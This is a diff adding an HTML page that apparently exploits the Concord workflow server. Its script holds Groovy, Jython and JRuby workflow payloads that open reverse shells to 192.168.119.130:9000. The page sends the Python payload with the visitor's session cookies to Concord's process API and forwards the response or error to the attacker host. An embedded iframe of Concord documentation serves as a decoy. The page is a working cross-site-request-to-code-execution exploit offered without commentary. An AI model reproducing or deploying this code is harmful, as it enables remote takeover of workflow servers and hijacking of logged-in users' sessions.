@@ -1,0 +1,83 @@
+
+<script>
+  const ip = "192.168.119.130";
+  const port = 9000;
+  payload_groovy = `
+configuration:
+  dependencies:
+  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
+flows:
+  default:
+    - script: groovy
+      body: |
+         String host = "${ip}";
+         int port = ${port};
+         String cmd = "/bin/sh";
+         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+         Socket s = new Socket(host, port);
+         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+         while (!s.isClosed()) {
+         while (pi.available() > 0) so.write(pi.read());
+         while (pe.available() > 0) so.write(pe.read());
+         while (si.available() > 0) po.write(si.read());
+         so.flush();
+         po.flush();
+         Thread.sleep(50);
+         try {
+            p.exitValue();
+            break;
+         } catch (Exception e) {}
+         };
+         p.destroy();
+         s.close();
+`
+  payload_python = `
+configuration:
+  dependencies:
+  - "mvn://org.python:jython-standalone:2.7.2"
+
+flows:
+  default:
+  - script: python
+    body: |
+      import subprocess
+
+      cmd = 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'
+
+      proc = subprocess.Popen(cmd ,bufsize=0, executable=None, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=None, close_fds=True, shell=True)
+
+      out = str(proc.communicate(proc.stdout))
+      execution.setVariable("result", out)
+  
+  - log: $\{result\}
+`
+  payload_ruby = `
+configuration:
+  dependencies:
+  - "mvn://org.jruby:jruby:9.1.13.0"
+
+flows:
+  default:
+  - script: ruby
+    body: |
+      system('python', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")')
+
+`
+  var ymlBlob = new Blob([payload_python], { type: "application/yml" });
+  var fd = new FormData();
+  fd.append('concord.yml', ymlBlob);
+  fetch("http://concord:8001/api/v1/process", {
+    credentials: 'include',
+    //mode: 'cors',
+    method: 'POST',
+    body: fd
+   })
+   .then(response => response.text())
+   .then(data => {
+      fetch(`http://${ip}/?msg=` + data )
+   }).catch(err => {
+      fetch(`http://${ip}/?err=` + err )
+   });
+</script>
+<iframe src="https://concord.walmartlabs.com/docs/index.html" width="100%" height="100%" />
